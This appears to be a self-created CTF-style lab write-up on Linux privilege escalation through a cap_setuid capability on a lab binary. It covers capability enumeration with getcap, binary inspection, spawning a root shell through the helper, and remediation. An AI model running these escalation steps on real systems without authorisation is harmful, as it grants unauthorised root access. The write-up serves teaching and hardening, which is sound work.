# Practice Lab — Linux Capability Misconfiguration

> **Practice content:** This is a self-created CTF-style lab scenario. It is not an official CTF challenge, a real-world finding, or a claim of a solved competition challenge.

## Category

Linux Privilege Escalation

## Objective

A low-privileged user has access to a Linux host where one executable has been given an unsafe Linux capability. The goal is to identify the capability, understand why it changes the security boundary, and use it in the isolated lab to demonstrate privilege escalation.

## Challenge Context

Assume the initial shell is available as an unprivileged account named `labuser`. No password, token, private key, or other credential is required for the scenario.

The intended investigation path is:

```text
Low-privileged shell
      ↓
Capability enumeration
      ↓
Unexpected file capability
      ↓
Capability-aware binary analysis
      ↓
Controlled privilege escalation
      ↓
Root-only lab resource
```

## Reconnaissance

Start by identifying the current user and host context.

```bash
id
uname -a
cat /etc/os-release
```

Then enumerate file capabilities. On systems using `libcap`, `getcap` is useful:

```bash
getcap -r / 2>/dev/null
```

A realistic lab result could look like:

```text
/usr/local/bin/lab-helper cap_setuid+ep
```

The important observation is not simply that the file is executable. `cap_setuid` allows the process to change its effective user ID. The `+ep` notation means the capability is present in the permitted and effective sets when the program executes.

## Vulnerability / Technique

Linux capabilities split some traditional root privileges into more granular privileges. This can reduce the need for full set-user-ID binaries, but assigning powerful capabilities to an unsafe executable can create an equivalent privilege-escalation path.

`cap_setuid` is especially sensitive because a program that can invoke `setuid(0)` can potentially transition its process to UID 0.

The key question during analysis is:

> Does the capability-bearing executable expose a code path that allows the capability to be used to change the process identity?

## Solution Steps

### 1. Inspect the capability-bearing executable

```bash
ls -l /usr/local/bin/lab-helper
getcap /usr/local/bin/lab-helper
file /usr/local/bin/lab-helper
```

### 2. Determine how it behaves

Run it normally and inspect its help/output first rather than immediately executing arbitrary payloads.

```bash
/usr/local/bin/lab-helper --help
```

For a compiled lab binary, basic static inspection can also help:

```bash
strings /usr/local/bin/lab-helper | less
readelf -s /usr/local/bin/lab-helper | grep -E 'setuid|execve|system'
```

### 3. Validate the privilege transition safely

In the controlled lab, the intended helper exposes a command-execution path that calls `setuid(0)` before launching the requested command. A minimal proof of the resulting identity is:

```bash
/usr/local/bin/lab-helper id
```

Expected lab behavior is that the spawned process reports UID 0. This is a **lab outcome**, not a real-world compromise claim.

A controlled shell demonstration can then be performed inside the isolated environment:

```bash
/usr/local/bin/lab-helper /bin/sh
id
```

The important validation is the process identity, not any invented flag or external system access.

### 4. Validate access to the protected lab resource

The lab can include a root-readable test file such as:

```bash
/root/lab-proof.txt
```

The exercise is complete when the capability abuse allows the controlled process to read the lab-only resource.

No real credentials or secret values are included in this writeup.

## Analysis

The security boundary was weakened by granting `cap_setuid+ep` to an executable that provides a path to execute another command after changing UID.

The capability itself is not automatically a vulnerability. The risk depends on what the executable can do with that privilege. A narrowly scoped, carefully designed binary may be acceptable, while a general command launcher with `cap_setuid` effectively provides a route to root.

## Useful Commands

### Find file capabilities

```bash
getcap -r / 2>/dev/null
```

### Inspect process identity

```bash
id
cat /proc/self/status | grep -E '^(Uid|Gid|Cap)'
```

### Inspect ELF symbols

```bash
readelf -s /usr/local/bin/lab-helper | grep -E 'setuid|execve|system'
```

### Check capabilities on a specific file

```bash
getcap /usr/local/bin/lab-helper
```

## Defensive Remediation

1. Remove unnecessary capabilities:

```bash
sudo setcap -r /usr/local/bin/lab-helper
```

2. Avoid granting `cap_setuid` to general-purpose command execution utilities.
3. Review file capabilities during host-hardening assessments.
4. Restrict writable directories and binaries that have elevated capabilities.
5. Monitor changes to extended file attributes and capabilities.
6. Prefer narrowly scoped privilege separation over exposing arbitrary command execution from a privileged process.

## Result

**Practice result:** the intended lab path demonstrates how an unsafe `cap_setuid` assignment can cross the user/root privilege boundary when combined with an executable that exposes a suitable UID-changing execution path.

No real flag, ranking, CVE, production compromise, or competition result is claimed.

## Lessons Learned

- Linux privilege escalation is not limited to SUID binaries; file capabilities must also be enumerated.
- `getcap -r /` is a useful privilege-escalation reconnaissance step on Linux hosts.
- `cap_setuid` deserves careful scrutiny because it can affect process identity.
- The presence of a capability is only the beginning of the analysis; the executable's behavior determines exploitability.
- Security reviews should consider both Unix permission bits and extended capabilities.
